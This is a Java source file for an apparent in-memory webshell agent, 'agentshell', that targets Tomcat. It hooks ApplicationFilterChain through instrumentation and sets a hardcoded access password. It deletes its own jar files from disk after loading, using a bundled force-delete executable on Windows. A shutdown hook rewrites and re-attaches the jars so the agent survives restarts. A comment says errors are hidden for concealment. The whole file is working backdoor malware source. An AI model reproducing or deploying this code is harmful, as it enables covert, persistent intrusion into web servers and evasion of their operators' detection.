package com.cocohall.agentshell;
import java.io.*;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.Arrays;


public class Agent {
    public static String className = "org.apache.catalina.core.ApplicationFilterChain";
    public static byte[] attachFileBytes = new byte[] {}, agentFileBytes = new byte[] {};
    public static String currentPath;
    public static String password = "cocohall";

    public static void agentmain(String agentArgs, Instrumentation inst) {

        if (agentArgs.indexOf("^") >= 0) {
            Agent.currentPath = agentArgs.split("\\^")[0];
            Agent.password = agentArgs.split("\\^")[1];
        } else {
            Agent.currentPath = agentArgs;
        }
        inst.addTransformer(new Transformer(), true);

        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class c : loadedClasses) {
            if (c.getName().equals(className)) {
                try {
                    inst.retransformClasses(c);
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
        try {
            readAttachFile(Agent.currentPath);
            readAgentFile(Agent.currentPath);
            clear(Agent.currentPath);
        } catch (Exception e) {
            // 为了隐蔽,不要打印异常信息
        }
		Agent.persist();
    }

    public static void persist() {
        try {
            Thread t = new Thread() {
                public void run() {
                    try {
                        writeFiles("attach.jar", Agent.attachFileBytes);
                        writeFiles("agent.jar", Agent.agentFileBytes);
                        startAttach();
                    } catch (Exception e) {

                    }
                }
            };
            t.setName("shutdown Thread");
            Runtime.getRuntime().addShutdownHook(t);
        } catch (Throwable t) {

        }
    }

    public static void writeFiles(String fileName, byte[] data) throws Exception {
        String tempFolder = System.getProperty("java.io.tmpdir");
        FileOutputStream fso = new FileOutputStream(tempFolder + File.separator + fileName);
        fso.write(data);
        fso.close();

    }

    public static void readAttachFile(String filePath) throws Exception {
        String fileName = "attach.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            attachFileBytes = mergeByteArray(attachFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void readAgentFile(String filePath) throws Exception {
        String fileName = "agent.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void startAttach() throws Exception {
        Thread.sleep(2000);
        String tempFolder = System.getProperty("java.io.tmpdir");
        String cmd = "java -jar " + tempFolder + File.separator + "attach.jar " + tempFolder + File.separator + "agent.jar" + Agent.password;
        Runtime.getRuntime().exec(cmd);
    }

    static byte[] mergeByteArray(byte[]... byteArray) {
        int totalLength = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            totalLength += byteArray[i].length;
        }

        byte[] result = new byte[totalLength];
        int cur = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
            cur += byteArray[i].length;
        }

        return result;
    }

    public static void clear(String currentPath) throws Exception {
        Thread clearThread = new Thread() {
            String currentPath = Agent.currentPath;

            public void run() {
                try {
                    Thread.sleep(5000);
                    String attachFile = currentPath + "attach.jar";
                    String agentFile = currentPath + "agent.jar";
                    new File(attachFile).getCanonicalFile().delete();
                    String OS = System.getProperty("os.name").toLowerCase();
                    if (OS.indexOf("windows") >= 0) {
                        try {
                            unlockFile(currentPath);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    new File(agentFile).delete();
                } catch (Exception e) {
                    //pass
                }
            }
        };
        clearThread.start();

    }

    public static void unlockFile(String currentPath) throws Exception {
        String exePath = currentPath + "foreceDelete.exe";
        InputStream is = Agent.class.getClassLoader().getResourceAsStream("other/forcedelete.exe");
        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            fos.write(bytes, 0, num);
            fos.flush();
        }
        fos.close();
        is.close();
        Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid());
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        new File(exePath).delete();
    }

    public static String getCurrentPid() {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        return runtimeMXBean.getName().split("@")[0];
    }

}
